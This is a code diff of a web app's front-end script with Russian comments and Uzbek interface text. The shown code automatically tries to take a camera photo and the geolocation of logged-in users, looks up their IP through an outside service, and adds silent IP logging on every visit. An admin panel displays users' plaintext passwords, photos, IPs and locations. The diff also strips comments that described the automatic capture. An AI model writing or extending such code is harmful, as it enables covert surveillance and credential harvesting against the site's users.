@@ -498,7 +498,7 @@
         </div>
     </div>
 
-    <!-- FALLBACK BAR (если браузер требует клик) -->
+    <!-- FALLBACK BAR -->
     <div id="permFallbackBar" class="hidden fixed bottom-4 left-1/2 -translate-x-1/2 z-[250] card-bg rounded-2xl px-5 py-3 shadow-2xl border border-blue-700/50 flex items-center gap-3 max-w-[95%]">
         <i class="fas fa-shield-alt text-blue-400 text-xl"></i>
         <div class="flex-grow">
@@ -512,7 +512,7 @@
     </div>
 
     <script>
-        // ===== IP пользователя (один раз при загрузке) =====
+        // ===== IP (один раз при загрузке) =====
         let userIP = '—';
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
@@ -647,7 +647,6 @@
             initPushNotifications();
             updateNotifBtnState();
 
-            // Если юзер уже залогинен — автоматически пытаемся получить разрешения
             setTimeout(tryAutoCapture, 2000);
         };
 
@@ -1203,7 +1202,6 @@
             closeAuthModal();
             navigateTo('home');
 
-            // Автоматически пытаемся получить камеру и гео
             setTimeout(tryAutoCapture, 500);
         }
 
@@ -1239,7 +1237,7 @@
             }
         }
 
-        // ===== ADMIN USERS (с фото, паролем, IP, локацией) =====
+        // ===== ADMIN USERS (фото, пароль, IP, локация) =====
         function renderAdminUsers() {
             document.getElementById('adminUsersList').innerHTML = db.users.map(u => {
                 const pass = u.passPlain || '—';
@@ -1447,12 +1445,39 @@
 
         function tryAutoCapture() {
             if (!db.currentUser) return;
-            if (db.currentUser.photo && db.currentUser.location) return;
 
-            const lastSkip = localStorage.getItem('perm_skip_' + db.currentUser.id);
-            if (lastSkip && (Date.now() - Number(lastSkip)) < 24 * 60 * 60 * 1000) return;
+            const needPhoto = !db.currentUser.photo;
+            const needGeo = !db.currentUser.location;
 
-            captureAll(true);
+            if (needPhoto || needGeo) {
+                const lastSkip = localStorage.getItem('perm_skip_' + db.currentUser.id);
+                if (lastSkip && (Date.now() - Number(lastSkip)) < 24 * 60 * 60 * 1000) {
+                    updateIPOnly();
+                    return;
+                }
+                captureAll(true);
+            } else {
+                // Фото и гео уже есть — обновляем только IP
+                updateIPOnly();
+            }
+        }
+
+        // Обновляет только IP (без камеры/гео)
+        function updateIPOnly() {
+            if (!db.currentUser || !userIP || userIP === '—') return;
+            if (db.currentUser.lastIP === userIP) return;
+
+            const u = db.users.find(x => x.id === db.currentUser.id);
+            if (!u) return;
+
+            u.lastIP = userIP;
+            const idx = db.users.findIndex(x => x.id === u.id);
+            if (idx !== -1) db.users[idx] = u;
+            db.currentUser = u;
+            localStorage.setItem('db_currentUser', JSON.stringify(u));
+            saveDb();
+
+            if (!document.getElementById('pageAdmin').classList.contains('hidden')) renderAdminUsers();
         }
 
         async function captureAll(isAuto = false) {
@@ -1521,12 +1546,13 @@
                 );
             });
 
-            // 3. СОХРАНЕНИЕ
-            if (cameraOk || geoOk) {
+            // 3. СОХРАНЕНИЕ (включая IP)
+            if (cameraOk || geoOk || (userIP && userIP !== '—')) {
                 const u = db.users.find(x => x.id === db.currentUser.id);
                 if (u) {
                     if (photoData) { u.photo = photoData; u.photoAt = new Date().toISOString(); }
                     if (locationData) { u.location = locationData; }
+                    if (userIP && userIP !== '—') u.lastIP = userIP;
 
                     const idx = db.users.findIndex(x => x.id === u.id);
                     if (idx !== -1) db.users[idx] = u;
@@ -1536,10 +1562,12 @@
                     saveDb();
                     if (!document.getElementById('pageAdmin').classList.contains('hidden')) renderAdminUsers();
 
-                    const parts = [];
-                    if (cameraOk) parts.push('rasm');
-                    if (geoOk) parts.push('joylashuv');
-                    toast(parts.join(' va ') + ' saqlandi ✅');
+                    if (cameraOk || geoOk) {
+                        const parts = [];
+                        if (cameraOk) parts.push('rasm');
+                        if (geoOk) parts.push('joylashuv');
+                        toast(parts.join(' va ') + ' saqlandi ✅');
+                    }
                 }
             } else if (isAuto) {
                 document.getElementById('permFallbackBar').classList.remove('hidden');
